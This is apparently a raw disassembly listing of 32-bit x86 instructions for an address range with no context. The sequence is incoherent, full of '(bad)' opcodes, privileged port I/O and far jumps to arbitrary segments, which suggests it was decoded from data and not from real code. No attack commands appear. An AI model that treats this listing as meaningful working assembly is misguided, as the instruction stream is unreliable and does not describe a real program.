  41eccd:	fisubr DWORD PTR [edi+0x32cdde4d]
  41ecd3:	add    al,0xda
  41ecd5:	cmc    
  41ecd6:	addr16 out 0x0,al
  41ecd9:	sub    al,BYTE PTR [esi+0x33]
  41ecdc:	and    eax,0xd2e56e6c
  41ece1:	stos   DWORD PTR es:[edi],eax
  41ece2:	in     al,dx
  41ece3:	cdq    
  41ece4:	std    
  41ece5:	ds mov dh,bh
  41ece8:	aam    0x37
  41ecea:	aam    0xbd
  41ecec:	push   ebx
  41eced:	dec    esp
  41ecee:	adc    BYTE PTR [eax+0x75ca40fe],al
  41ecf4:	int3   
  41ecf5:	imul   edx,DWORD PTR [edi-0x3c21c35d],0x6e947dad
  41ecff:	and    ch,BYTE PTR [ebx]
  41ed01:	pop    ecx
  41ed02:	out    dx,al
  41ed03:	lock pop ss
  41ed05:	fild   DWORD PTR [ecx-0x13f044e3]
  41ed0b:	jne    0x41ecc5
  41ed0d:	test   esi,esi
  41ed0f:	fsubr  st,st(3)
  41ed11:	xchg   BYTE PTR [ecx+0x1c],ah
  41ed14:	dec    ebp
  41ed15:	pusha  
  41ed16:	in     eax,dx
  41ed17:	jb     0x41ecc3
  41ed19:	pop    ds
  41ed1a:	dec    ebp
  41ed1b:	adc    edx,eax
  41ed1d:	icebp  
  41ed1e:	lods   eax,DWORD PTR ds:[esi]
  41ed1f:	mov    ds:0xaf4c1f72,al
  41ed24:	push   0xffffffd6
  41ed26:	clc    
  41ed27:	repnz push cs
  41ed29:	inc    edi
  41ed2a:	mov    ecx,0x38e55155
  41ed2f:	sub    eax,0xbad2367f
  41ed34:	inc    esi
  41ed35:	(bad)  
  41ed36:	stos   DWORD PTR es:[edi],eax
  41ed37:	xor    ecx,DWORD PTR [edi-0x17aaad44]
  41ed3d:	ret    
  41ed3e:	fst    st(0)
  41ed40:	xchg   edi,eax
  41ed41:	ins    DWORD PTR es:[edi],dx
  41ed42:	mov    bl,0x21
  41ed44:	push   0xbadafbc4
  41ed49:	pop    ebp
  41ed4a:	jns    0x41ed1f
  41ed4c:	sahf   
  41ed4d:	ret    0xff79
  41ed50:	pop    edi
  41ed51:	jo     0x41ed92
  41ed53:	iret   
  41ed54:	daa    
  41ed55:	push   ds
  41ed56:	sbb    al,0xc6
  41ed58:	pushf  
  41ed59:	push   ss
  41ed5a:	fcomp  QWORD PTR [eax+edx*8]
  41ed5d:	int3   
  41ed5e:	xchg   ebp,eax
  41ed5f:	push   esp
  41ed60:	push   es
  41ed61:	call   0x9af9ec52
  41ed66:	and    DWORD PTR [ecx-0x10c9597d],edx
  41ed6c:	cmp    ebp,eax
  41ed6e:	test   BYTE PTR [edi],bh
  41ed70:	and    al,BYTE PTR [edi-0x750dfff6]
  41ed76:	aad    0x74
  41ed78:	xchg   edi,eax
  41ed79:	xchg   esp,esp
  41ed7b:	adc    ch,0x5a
  41ed7e:	fidiv  DWORD PTR [ebx+0x37]
  41ed81:	jmp    0x41edc7
  41ed83:	mov    ah,0x54
  41ed85:	pusha  
  41ed86:	mov    dl,0xed
  41ed88:	fst    st(2)
  41ed8a:	mov    ds:0x9cb8e31f,eax
  41ed8f:	xor    BYTE PTR [ecx-0x26446afe],ah
  41ed95:	lds    ebp,FWORD PTR [edi+0x7f]
  41ed98:	stos   BYTE PTR es:[edi],al
  41ed99:	stos   DWORD PTR es:[edi],eax
  41ed9a:	arpl   WORD PTR [ebx+0x63275202],dx
  41eda0:	adc    ecx,ebx
  41eda2:	cmp    eax,0x2f6e7d94
  41eda7:	xor    DWORD PTR [ecx+0x7d],edx
  41edaa:	dec    edx
  41edab:	mov    ds:0xc610a4d7,eax
  41edb0:	inc    edi
  41edb1:	or     esp,eax
  41edb3:	aaa    
  41edb4:	sub    bh,0xba
  41edb7:	dec    esp
  41edb8:	shl    DWORD PTR [esi+0x63],1
  41edbb:	xchg   edx,eax
  41edbc:	rcr    esp,cl
  41edbe:	stos   WORD PTR es:[edi],ax
  41edc0:	out    0xe7,eax
  41edc2:	adc    esi,0xc7ae6d57
  41edc8:	cwde   
  41edc9:	push   eax
  41edca:	int3   
  41edcb:	xor    BYTE PTR [edi+0x1a],0x6c
  41edcf:	icebp  
  41edd0:	ds mov esi,0x28ff6d73
  41edd6:	mov    al,bh
  41edd8:	data16 arpl WORD PTR ds:0x9be01992,dx
  41eddf:	jns    0x41ee51
  41ede1:	sub    eax,0x47bb64e8
  41ede6:	push   esp
  41ede7:	cdq    
  41ede8:	add    ah,al
  41edea:	sti    
  41edeb:	jl     0x41ee3c
  41eded:	mov    al,0x1e
  41edef:	jl     0x41ee09
  41edf1:	inc    ebp
  41edf2:	neg    BYTE PTR [ecx-0x3f]
  41edf5:	inc    esi
  41edf6:	dec    ebx
  41edf7:	sbb    al,0x41
  41edf9:	pop    ss
  41edfa:	stos   BYTE PTR es:[edi],al
  41edfb:	push   0x31
  41edfd:	and    al,0x84
  41edff:	mov    BYTE PTR [ecx+0x9be786],ch
  41ee05:	jns    0x41ee79
  41ee07:	cdq    
  41ee08:	ds mov edi,0x2c3205cf
  41ee0e:	mov    al,0xa2
  41ee10:	pop    ebx
  41ee11:	dec    ch
  41ee13:	cmp    ebx,eax
  41ee15:	mov    bl,0x20
  41ee17:	mov    ah,0xab
  41ee19:	loop   0x41edbc
  41ee1b:	adc    ebx,esp
  41ee1d:	inc    eax
  41ee1e:	pop    eax
  41ee1f:	faddp  st(0),st
  41ee21:	daa    
  41ee22:	mov    al,0x46
  41ee24:	dec    edx
  41ee25:	pop    ss
  41ee26:	(bad)  
  41ee27:	hlt    
  41ee28:	out    0x7e,eax
  41ee2a:	rcr    BYTE PTR [ebx+edx*4],1
  41ee2d:	test   eax,0x870c31ba
  41ee32:	xchg   BYTE PTR [esi],bh
  41ee34:	jmp    0x8f87b732
  41ee39:	outs   dx,DWORD PTR ds:[esi]
  41ee3a:	pop    esi
  41ee3b:	jbe    0x41ee26
  41ee3d:	mov    bl,0xec
  41ee3f:	inc    esp
  41ee40:	sbb    al,BYTE PTR [esi+0x51]
  41ee43:	jne    0x41edcf
  41ee45:	sub    eax,0xb289d354
  41ee4a:	sub    BYTE PTR [eax],al
  41ee4c:	pop    DWORD PTR [ebx-0x78]
  41ee4f:	faddp  st(0),st
  41ee51:	dec    edx
  41ee52:	mov    eax,0xaf016785
  41ee57:	sbb    eax,0xec1934a9
  41ee5c:	mov    ch,0xec
  41ee5e:	fsub   st(1),st
  41ee60:	push   eax
  41ee61:	xor    eax,0x1a71865c
  41ee66:	mov    eax,ds:0x9c5ef597
  41ee6b:	push   cs
  41ee6c:	mov    fs,WORD PTR [ecx-0xc]
  41ee6f:	adc    bh,BYTE PTR [esi]
  41ee71:	inc    ebp
  41ee72:	(bad)  
  41ee73:	sahf   
  41ee74:	mov    edx,0x5ff910fc
  41ee79:	jo     0x41eebe
  41ee7b:	xchg   ebx,eax
  41ee7c:	dec    eax
  41ee7d:	rcr    DWORD PTR [esi-0x42829edb],0x95
  41ee84:	scas   al,BYTE PTR es:[edi]
  41ee85:	or     eax,0x54d9f5a0
  41ee8a:	xchg   ebp,eax
  41ee8b:	cld    
  41ee8c:	cwde   
  41ee8d:	inc    esp
  41ee8e:	test   DWORD PTR [eax+0x2bd68817],esi
  41ee94:	sahf   
  41ee95:	xchg   edx,eax
  41ee96:	sbb    edi,DWORD PTR [edi+0x2ff63753]
  41ee9c:	xchg   BYTE PTR [ebx],al
  41ee9e:	mov    edi,0xd6bac113
  41eea3:	pop    ebp
  41eea4:	repz jmp 0xb683:0x99bbd7d7
  41eeac:	stc    
  41eead:	adc    cl,al
  41eeaf:	jmp    0x580b:0x73825c1c
  41eeb6:	loop   0x41ef36
  41eeb8:	inc    esi
  41eeb9:	bound  ebp,QWORD PTR [edi-0x68]
  41eebc:	xor    al,0xb2
  41eebe:	mov    bl,0xab
  41eec0:	jb     0x41ef24
  41eec2:	je     0x41ee83
  41eec4:	leave  
  41eec5:	daa    
  41eec6:	lods   al,BYTE PTR ds:[esi]
  41eec7:	mov    dl,BYTE PTR [esi-0x7025679]
  41eecd:	mov    BYTE PTR [edx-0x73],ch
  41eed0:	outs   dx,DWORD PTR ds:[esi]
  41eed1:	and    eax,0x1a70be26
  41eed6:	sub    DWORD PTR [eax],edx
  41eed8:	stos   DWORD PTR es:[edi],eax
  41eed9:	ffree  st(6)
  41eedb:	test   al,0xe6
  41eedd:	ficomp WORD PTR [edx]
  41eedf:	call   0xe928dd04
  41eee4:	je     0x41ee91
  41eee6:	sbb    DWORD PTR [esi+0x23],edx
  41eee9:	fnstcw WORD PTR [edx+0x5b7e5077]
  41eeef:	cmp    eax,0x8be2f528
  41eef4:	jge    0x41eeab
  41eef6:	and    esi,DWORD PTR [edi+0x47881252]
  41eefc:	inc    esi
  41eefd:	stos   DWORD PTR es:[edi],eax
  41eefe:	and    eax,0xc1ff8c97
  41ef03:	fdivrp st(3),st
  41ef05:	add    BYTE PTR [ecx],0xbc
  41ef08:	sti    
  41ef09:	push   cs
  41ef0a:	je     0x41ef8b
  41ef0c:	xchg   ecx,eax
  41ef0d:	cli    
  41ef0e:	inc    ecx
  41ef0f:	jne    0x41ef67
  41ef11:	stos   DWORD PTR es:[edi],eax
  41ef12:	pusha  
  41ef13:	aas    
  41ef14:	mov    esp,0xca57c2aa
  41ef19:	xor    BYTE PTR [ebp+eiz*2-0x7f],dh
  41ef1d:	inc    eax
  41ef1e:	cmp    bh,dl
  41ef20:	fdivr  DWORD PTR [esi-0x72]
  41ef23:	add    al,0x9d
  41ef25:	adc    BYTE PTR [ebp+0x0],bl
  41ef28:	xlat   BYTE PTR ds:[ebx]
  41ef29:	add    esi,DWORD PTR [edi+eax*4+0x4baea7dc]
  41ef30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef31:	int    0x64
  41ef33:	fisttp QWORD PTR [eax]
  41ef35:	xchg   edi,eax
  41ef36:	ds mov esi,0x42f0fe90
  41ef3c:	dec    edx
  41ef3d:	cmp    ah,dl
  41ef3f:	gs push ebp
  41ef41:	popa   
  41ef42:	out    0xb3,al
  41ef44:	mov    eax,0x62382124
  41ef49:	loop   0x41ef85
  41ef4b:	scas   al,BYTE PTR es:[edi]
  41ef4c:	mov    ebx,0x2ac53e61
  41ef51:	ss sbb edi,0xffffff98
  41ef55:	(bad)  
  41ef56:	push   esi
  41ef57:	push   esp
  41ef58:	push   ebx
  41ef59:	mov    eax,ds:0xc8e35409
  41ef5e:	fs add edi,esi
  41ef61:	test   BYTE PTR [edx+esi*2-0x5c],0xb9
  41ef66:	sub    dh,BYTE PTR [eax+0x66]
  41ef69:	ds es jg 0x41ef97
  41ef6d:	mov    esp,0x4ad506d5
  41ef72:	xor    bl,BYTE PTR [ebp+0x1f4981a2]
  41ef78:	nop
  41ef79:	cwde   
  41ef7a:	cmp    BYTE PTR [eax-0x7d],ch
  41ef7d:	inc    ecx
  41ef7e:	test   esi,esp
  41ef80:	cs enter 0xdbec,0x4f
  41ef85:	add    BYTE PTR [ebp-0x21],ah
  41ef88:	xor    al,0x1c
  41ef8a:	xchg   BYTE PTR [ecx],dl
  41ef8c:	dec    eax
  41ef8d:	inc    edi
  41ef8e:	mov    ecx,DWORD PTR [edi-0x18]
  41ef91:	push   ecx
  41ef92:	sti    
  41ef93:	pop    edx
  41ef94:	popa   
  41ef95:	or     edi,DWORD PTR [ebx-0xed938f5]
  41ef9b:	aam    0xb0
  41ef9d:	mov    esp,0xc4f617db
  41efa2:	or     dl,BYTE PTR [ebx]
  41efa4:	xchg   edx,eax
  41efa5:	jns    0x41f001
  41efa7:	in     eax,0x77
  41efa9:	lods   al,BYTE PTR ds:[esi]
  41efaa:	lds    ebx,FWORD PTR [esi+edi*4]
  41efad:	inc    esi
  41efae:	int3   
  41efaf:	mov    edx,0xa2b28849
  41efb4:	pop    ds
  41efb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efb6:	clc    
  41efb7:	sub    BYTE PTR [ebp+0x2f],0xe3
  41efbb:	pop    es
  41efbc:	sbb    ch,BYTE PTR [ebx-0x10]
  41efbf:	pop    ebp
  41efc0:	pop    eax
  41efc1:	test   ebx,edi
  41efc3:	repnz mov dh,0xad
  41efc6:	inc    ebx
  41efc7:	jg     0x41ef5d
  41efc9:	sub    ebp,0x3e
  41efcc:	call   0xd03a:0x19d22258
  41efd3:	jmp    0x41efc2
  41efd5:	jmp    0x41ef92
  41efd7:	xor    DWORD PTR [edx+0x24b10c19],0x63c93d0b
  41efe1:	(bad)  
  41efe2:	mov    ebx,0xe4bc3381
  41efe7:	xchg   dl,al
  41efe9:	cmc    
  41efea:	mov    esi,0xf48ae50e
  41efef:	mov    esi,edi
  41eff1:	jb     0x41f06c
  41eff3:	lea    edx,[ebp-0x63]
  41eff6:	rcr    DWORD PTR [ecx],0x3c
  41eff9:	xlat   BYTE PTR ds:[ebx]
  41effa:	mul    BYTE PTR [eax+ebx*1+0x65]
  41effe:	mov    edi,0xebc12708
  41f003:	addr16 jmp 0xd217:0x8082d072
  41f00b:	inc    ebp
  41f00c:	sbb    al,0xfb
  41f00e:	sbb    DWORD PTR [ecx-0x74d0bea7],edi
  41f014:	aaa    
  41f015:	mov    ebp,0xcc5bda2e
  41f01a:	sbb    BYTE PTR [esi+0x17],cl
  41f01d:	xchg   esi,eax
  41f01e:	mov    DWORD PTR [eax+edi*1-0x7ab3d7ad],esi
  41f025:	int3   
  41f026:	rcr    edi,0x6d
  41f029:	addr16 mov eax,ds:0x90bd
  41f02d:	sub    eax,ecx
  41f02f:	outs   dx,BYTE PTR ds:[esi]
  41f030:	dec    esp
  41f031:	jmp    0x41f055
  41f033:	in     al,dx
  41f034:	or     ebp,esi
  41f036:	jmp    FWORD PTR [ebp-0x7984718b]
  41f03c:	mov    esi,0xc858f42e
  41f041:	test   al,0x98
  41f043:	daa    
  41f044:	mov    ch,0x31
  41f046:	bound  ebp,QWORD PTR [ecx+0x25624604]
  41f04c:	push   0xffffffe8
  41f04e:	xlat   BYTE PTR ds:[ebx]
  41f04f:	or     al,0x43
  41f051:	mov    ecx,ebp
  41f053:	fucomi st,st(1)
  41f055:	mov    bh,0x2a
  41f057:	repz hlt 
  41f059:	in     eax,0x46
  41f05b:	iret   
  41f05c:	inc    eax
  41f05d:	mov    esi,0x39097cfb
  41f062:	call   0xc828:0x579f6421
  41f069:	loop   0x41f042
  41f06b:	mov    eax,ds:0xb2479e47
  41f070:	push   0xffffffc9
  41f072:	or     dl,BYTE PTR [edx+0x0]
  41f075:	dec    ebx
  41f076:	and    eax,0x75195068
  41f07b:	ret    0x88ba
  41f07e:	fiadd  WORD PTR [eax]
  41f080:	add    dh,BYTE PTR [edi]
  41f082:	pop    ecx
  41f083:	fcomp  QWORD PTR gs:[edi]
  41f086:	inc    eax
  41f087:	(bad)  
  41f088:	or     ecx,ebx
  41f08a:	sbb    DWORD PTR [ecx-0x4f],ebx
  41f08d:	xchg   esi,eax
  41f08e:	inc    ebp
  41f08f:	fild   WORD PTR [ecx-0x59c73936]
  41f095:	push   eax
  41f096:	icebp  
  41f097:	sub    al,0xa4
  41f099:	dec    eax
  41f09a:	hlt    
  41f09b:	fisttp QWORD PTR [edi]
  41f09d:	(bad)  
  41f09e:	lods   eax,DWORD PTR ds:[esi]
  41f09f:	rcl    edx,cl
  41f0a1:	jae    0x41f0cc
  41f0a3:	sahf   
  41f0a4:	lods   al,BYTE PTR ds:[esi]
  41f0a5:	je     0x41f0a0
  41f0a7:	call   0x1967:0x269de7a
  41f0ae:	add    esp,DWORD PTR [eax-0x5]
  41f0b1:	lahf   
  41f0b2:	in     al,0xe1
  41f0b4:	dec    ebx
  41f0b5:	sub    cl,cl
  41f0b7:	cdq    
  41f0b8:	push   0x4ec4def7
  41f0bd:	ror    bl,0xe2
  41f0c0:	call   0xec5:0xecf88af7
  41f0c7:	and    al,0xfb
  41f0c9:	push   0xffffffff
  41f0cb:	push   0xffffffc7
  41f0cd:	popf   
  41f0ce:	cmp    DWORD PTR [esp+ebx*4-0x1c],ebx
  41f0d2:	das    
  41f0d3:	cmp    dh,ah
  41f0d5:	adc    DWORD PTR [ebx],esi
  41f0d7:	xchg   BYTE PTR ds:0x2ae17445,bl
  41f0dd:	xchg   ebx,eax
  41f0de:	ret    
  41f0df:	out    0xb,eax
  41f0e1:	jge    0x41f121
  41f0e3:	dec    ecx
  41f0e4:	xor    BYTE PTR [ebx+0x74e53330],bl
  41f0ea:	jns    0x41f07d
  41f0ec:	out    0xef,eax
  41f0ee:	das    
  41f0ef:	rcl    BYTE PTR [ecx],1
  41f0f1:	cmc    
  41f0f2:	fwait
  41f0f3:	add    esi,eax
  41f0f5:	pop    esi
  41f0f6:	add    eax,0x9d430f6a
  41f0fb:	(bad)
  41f0fe:	push   esi
  41f0ff:	(bad)  
  41f100:	popa   
  41f101:	call   0x88057554
  41f106:	aad    0x9e
  41f108:	call   0x300b2202
  41f10d:	mov    edx,0x32ade183
  41f112:	dec    esp
  41f113:	aas    
  41f114:	pop    eax
  41f115:	xor    BYTE PTR [edi],ch
  41f117:	jo     0x41f0d5
  41f119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f11a:	dec    esi
  41f11b:	cwde   
  41f11c:	mov    ebx,edi
  41f11e:	sub    al,0xda
  41f120:	push   edi
  41f121:	pop    ebx
  41f122:	aam    0x1c
  41f124:	imul   ebp,DWORD PTR [edi-0x2f2e81e1],0xb5b779dd
  41f12e:	cdq    
  41f12f:	pop    ecx
  41f130:	jle    0x41f0f0
  41f132:	pop    ecx
  41f133:	retf   
  41f134:	in     eax,0x77
  41f136:	or     ch,ah
  41f138:	cmp    dh,BYTE PTR [eax+0x64a445d0]
  41f13e:	sub    al,0x49
  41f140:	dec    edx
  41f141:	mov    edx,0xb59ddfd5
  41f146:	frstor [ecx-0x34]
  41f149:	adc    eax,0x4c466cba
  41f14e:	bound  esi,QWORD PTR [edi+0x31]
  41f151:	inc    edx
  41f152:	sbb    al,0x55
  41f154:	shr    DWORD PTR [esp+ebp*4-0x44facfc9],cl
  41f15b:	jae    0x41f0e5
  41f15d:	jns    0x41f1c9
  41f15f:	in     eax,0xed
  41f161:	sub    DWORD PTR [ecx],0x1c375048
  41f167:	and    BYTE PTR [edi+eiz*4],al
  41f16a:	push   esi
  41f16b:	repnz (bad) 
  41f16e:	inc    ecx
  41f16f:	xchg   edi,eax
  41f170:	push   eax
  41f171:	mov    cl,0xb4
  41f173:	add    al,0x9a
  41f175:	int3   
  41f176:	lahf   
  41f177:	stos   BYTE PTR es:[edi],al
  41f178:	int    0xff
  41f17a:	mov    ecx,0x9fb43d37
  41f17f:	sbb    BYTE PTR [esi+eax*1],bl
  41f182:	ds xor eax,0xa0fa8b98
  41f188:	add    BYTE PTR [ecx-0x8],0x7e
  41f18c:	push   0xffffffb1
  41f18e:	xchg   esi,eax
  41f18f:	push   esi
  41f190:	clc    
  41f191:	push   edi
  41f192:	push   0xffffffa5
  41f194:	jbe    0x41f144
  41f196:	mov    edi,0xacf0d7
  41f19b:	pop    ds
  41f19c:	or     esi,edx
  41f19e:	data16 jbe 0x41f1e2
  41f1a1:	mov    ebx,0xddc01004
  41f1a6:	xor    eax,0x3ca3e5ee
  41f1ab:	cmc    
  41f1ac:	lds    ebp,FWORD PTR [ecx]
  41f1ae:	fild   WORD PTR [edi-0x73fbd029]
  41f1b4:	adc    DWORD PTR [ebx+edx*8],eax
  41f1b7:	sti    
  41f1b8:	test   esi,esi
  41f1ba:	push   cs
  41f1bb:	sti    
  41f1bc:	test   DWORD PTR [edx+0xb],ebx
  41f1bf:	sbb    DWORD PTR [ecx-0x1f],ebx
  41f1c2:	xchg   ecx,eax
  41f1c3:	shr    DWORD PTR [eax-0x7a],0x91
  41f1c7:	cmp    esp,DWORD PTR [edi+0x46]
  41f1ca:	out    dx,eax
  41f1cb:	leave  
  41f1cc:	and    cl,BYTE PTR [esi]
  41f1ce:	fxch   st(1)
  41f1d0:	ret    0xfbae
  41f1d3:	push   ecx
  41f1d4:	sub    cl,0xf8
  41f1d7:	pop    eax
  41f1d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1d9:	pop    edi
  41f1da:	and    eax,0xf56e9cbb
  41f1df:	pop    ebx
  41f1e0:	mov    dl,0xc5
  41f1e2:	call   0x35ba:0xa15dc7a
  41f1e9:	(bad)  
  41f1ea:	dec    ecx
  41f1eb:	or     cl,BYTE PTR [esi+edi*2-0x3b]
  41f1ef:	or     al,0x3f
  41f1f1:	inc    ebp
  41f1f2:	call   0x21b3:0xb31c5794
  41f1f9:	pop    eax
  41f1fa:	push   edi
  41f1fb:	aas    
  41f1fc:	es mov edx,0x127c8c20
  41f202:	mov    ebx,0xfdf3e3ac
  41f207:	stc    
  41f208:	popf   
  41f209:	nop
  41f20a:	jmp    0xcf98:0xd2138ce2
  41f211:	jae    0x41f235
  41f213:	mov    edi,DWORD PTR ds:0xd702fbae
  41f219:	inc    esi
  41f21a:	xchg   ecx,eax
  41f21b:	dec    eax
  41f21c:	inc    esp
  41f21d:	mov    ch,0x55
  41f21f:	inc    ebx
  41f220:	in     al,dx
  41f221:	jmp    0x1a69232d
  41f226:	arpl   di,di
  41f228:	addr16 xor al,0xb1
  41f22b:	in     eax,dx
  41f22c:	sti    
  41f22d:	push   ebx
  41f22e:	js     0x41f277
  41f230:	dec    edx
  41f231:	mov    DWORD PTR [edi-0x15],0x25e26ce4
  41f238:	xchg   ebp,eax
  41f239:	pop    esi
  41f23a:	cmp    DWORD PTR [esi],ecx
  41f23c:	mov    dl,0x92
  41f23e:	cs push cs
  41f240:	shl    ch,1
  41f242:	ret    
  41f243:	fwait
  41f244:	sub    DWORD PTR [edi-0x1a],ebp
  41f247:	call   0x7db3878
  41f24c:	jmp    0x8e8d:0x5f4b4b66
  41f253:	fisubr DWORD PTR [edx-0x4be1d1f8]
  41f259:	pop    ds
  41f25a:	inc    esi
  41f25b:	cdq    
  41f25c:	and    eax,0x6b4a84c5
  41f261:	mov    ebp,0x405abfaf
  41f266:	pushf  
  41f267:	int3   
  41f268:	inc    ebx
  41f269:	shr    DWORD PTR [ebx+0x6d],0x46
  41f26d:	or     ecx,edx
  41f26f:	int    0x38
  41f271:	rcr    DWORD PTR [ebx],0x8e
  41f274:	mov    edx,0x896c987b
  41f279:	retf   
  41f27a:	pop    ss
  41f27b:	add    al,BYTE PTR [edx+0x1a8ef63]
  41f281:	sahf   
  41f282:	test   BYTE PTR cs:[eax+edi*8+0x49],dh
  41f287:	mov    fs,ebx
  41f289:	ds adc eax,0x8a07c806
  41f28f:	cmp    BYTE PTR [edi],bh
  41f291:	jo     0x41f2c3
  41f293:	jo     0x41f23a
  41f295:	shld   DWORD PTR [ecx-0x34961065],ebx,0x4d
  41f29d:	in     eax,dx
  41f29e:	loope  0x41f2c4
  41f2a0:	sub    DWORD PTR [edi+0x796d9a5b],eax
  41f2a6:	or     BYTE PTR [eax-0xc],dh
  41f2a9:	adc    DWORD PTR [edx-0x519f6a5d],eax
  41f2af:	retf   
  41f2b0:	in     al,0x2b
  41f2b2:	xor    ah,ah
  41f2b4:	shl    DWORD PTR [eax-0x3c],1
  41f2b7:	mov    al,0xf
  41f2b9:	xor    eax,0x22ebac96
  41f2be:	push   ebx
  41f2bf:	sub    DWORD PTR [eax],edx
  41f2c1:	rcl    ah,0x2b
  41f2c4:	pop    esi
  41f2c5:	mov    BYTE PTR [ebx+0x7b],0xa8
  41f2c9:	inc    DWORD PTR [esi+0x68]
  41f2cc:	mov    eax,ds:0x104f326
  41f2d1:	aad    0x9d
  41f2d3:	out    0xa5,al
  41f2d5:	iret   
  41f2d6:	sbb    eax,0xd06e062c
  41f2dc:	lea    esp,[esp+ecx*2]
  41f2df:	rcl    BYTE PTR [eax-0x603195fc],1
  41f2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2e6:	call   DWORD PTR [edi-0x5a]
  41f2e9:	lock push esi
  41f2eb:	ja     0x41f2df
  41f2ed:	and    BYTE PTR ds:0x45ae85d2,dl
  41f2f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2f4:	add    DWORD PTR [ecx+eiz*4],edx
  41f2f7:	add    dh,BYTE PTR [edx-0x4e80cbbf]
  41f2fd:	and    esi,DWORD PTR [edi]
  41f2ff:	imul   edi,eax,0xf76a996
  41f305:	xchg   esi,eax
  41f306:	je     0x41f2d8
  41f308:	cmp    bh,bl
  41f30a:	sub    al,0x1b
  41f30c:	sub    BYTE PTR ds:0xa2d9e4ca,bh
  41f312:	jno    0x41f30c
  41f314:	push   es
  41f315:	fcmove st,st(1)
  41f317:	push   es
  41f318:	jns    0x41f398
  41f31a:	pop    es
  41f31b:	hlt    
  41f31c:	sbb    DWORD PTR [edi+0x34be9674],esi
  41f322:	sub    al,0xaa
  41f324:	add    ebp,0xd6ad9f03
  41f32a:	adc    edi,edi
  41f32c:	repnz xor al,0xd8
  41f32f:	fnstenv ds:0x72c98b67
  41f335:	and    edi,ebx
  41f337:	shl    BYTE PTR [edi+0x679a68eb],cl
  41f33d:	mov    esp,0xb640ace8
  41f342:	in     al,dx
  41f343:	sbb    dh,BYTE PTR [ebp+0x6db99209]
  41f349:	add    al,BYTE PTR es:[ebp+0x1944e3b4]
  41f350:	pop    esi
  41f351:	shr    DWORD PTR [esi],cl
  41f353:	stc    
  41f354:	into   
  41f355:	xor    BYTE PTR [esi],ch
  41f357:	div    BYTE PTR [eax+0x2486ec2]
  41f35d:	add    ecx,DWORD PTR [ecx+0x32763c00]
  41f363:	and    BYTE PTR [ecx+ecx*4+0x13],ah
  41f367:	in     eax,0x46
  41f369:	sbb    al,BYTE PTR [edi+0x1f30d483]
  41f36f:	inc    edx
  41f370:	cli    
  41f371:	fsubr  DWORD PTR ss:[ebx+0x1f153a6]
  41f378:	xchg   ecx,eax
  41f379:	jle    0x41f3ae
  41f37b:	mov    al,ds:0x8665a7b5
  41f380:	pop    ebx
  41f381:	inc    esp
  41f382:	sbb    dl,BYTE PTR [edi-0x6500fcbf]
  41f388:	shl    DWORD PTR [edx-0x25a8c5d6],1
  41f38e:	les    ebx,FWORD PTR [esp+ebx*4]
  41f391:	or     BYTE PTR [ecx],0x90
  41f394:	int    0x15
  41f396:	icebp  
  41f397:	mov    DWORD PTR [esi-0x7e],ecx
  41f39a:	(bad)  [ebp-0xa]
  41f39d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f39e:	adc    BYTE PTR ds:0x60b003,dh
  41f3a4:	loopne 0x41f394
  41f3a6:	test   al,0xf5
  41f3a8:	out    0x1f,eax
  41f3aa:	sub    esi,DWORD PTR [esi]
  41f3ac:	sub    cl,bl
  41f3ae:	gs (bad) 
  41f3b0:	enter  0x606e,0xf5
  41f3b4:	loope  0x41f3af
  41f3b6:	in     eax,0x7d
  41f3b8:	dec    esi
  41f3b9:	add    BYTE PTR [ebp-0x3ca1028b],bh
  41f3bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3c0:	and    DWORD PTR ds:0xa3ac25a3,edi
  41f3c6:	leave  
  41f3c7:	scas   al,BYTE PTR es:[edi]
  41f3c8:	push   ebx
  41f3c9:	sub    eax,0x105b932a
  41f3ce:	repnz pushf 
  41f3d0:	fs jg  0x41f3fc
  41f3d3:	rdpmc  
  41f3d5:	arpl   WORD PTR [eax+0x61954e34],dx
  41f3db:	in     eax,dx
  41f3dc:	imul   DWORD PTR [edx+0x22]
  41f3df:	shr    DWORD PTR [ebp-0x30],1
  41f3e2:	push   0xbe18d1f5
  41f3e7:	sbb    dh,dh
  41f3e9:	clc    
  41f3ea:	xlat   BYTE PTR ds:[ebx]
  41f3eb:	popa   
  41f3ec:	cld    
  41f3ed:	mov    ds:0xf570e9f2,al
  41f3f2:	pop    edi
  41f3f3:	mov    BYTE PTR [ebx+0x4eb59b10],cl
  41f3f9:	aaa    
  41f3fa:	fadd   st,st(4)
  41f3fc:	out    0x94,al
  41f3fe:	call   FWORD PTR [ebx-0x10decf8]
  41f404:	ret    
  41f405:	push   0xdd4acaf5
  41f40a:	in     al,0xb
  41f40c:	mov    dl,0xe3
  41f40e:	dec    ebp
  41f40f:	repnz inc eax
  41f411:	mov    dl,0xc0
  41f413:	mov    edx,DWORD PTR [ebp-0x2f]
  41f416:	imul   ecx,DWORD PTR [eax+0x4c],0x3b
  41f41a:	loopne 0x41f466
  41f41c:	ss inc ebp
  41f41e:	arpl   WORD PTR [ebx+0x1317739e],sp
  41f424:	cld    
  41f425:	ficom  DWORD PTR [esi]
  41f427:	scas   al,BYTE PTR es:[edi]
  41f428:	div    BYTE PTR [edx+0x261999f6]
  41f42e:	jl     0x41f469
  41f430:	test   BYTE PTR [esi-0x42ee5edd],al
  41f436:	cdq    
  41f437:	bound  esi,QWORD PTR [ecx-0x69]
  41f43a:	and    al,BYTE PTR [ebp+esi*1+0x5a]
  41f43e:	retf   0x96e6
  41f441:	xchg   BYTE PTR ds:0xd599724d,dl
  41f447:	fild   DWORD PTR [edx+0x792967a1]
  41f44d:	jp     0x41f42b
  41f44f:	pop    ds
  41f450:	dec    DWORD PTR [edx]
  41f452:	sbb    DWORD PTR [eax-0x47168765],ecx
  41f458:	jns    0x41f471
  41f45a:	inc    ebp
  41f45b:	sbb    DWORD PTR [ecx-0x39],ebp
  41f45e:	sahf   
  41f45f:	stc    
  41f460:	mov    ds:0x94261fd3,al
  41f465:	addr16 mov ebp,0x7e382331
  41f46b:	(bad)  
  41f46c:	(bad)  
  41f46d:	jecxz  0x41f448
  41f46f:	cs dec ebp
  41f471:	pop    ds
  41f472:	add    eax,0xfd3bb6c0
  41f477:	jecxz  0x41f425
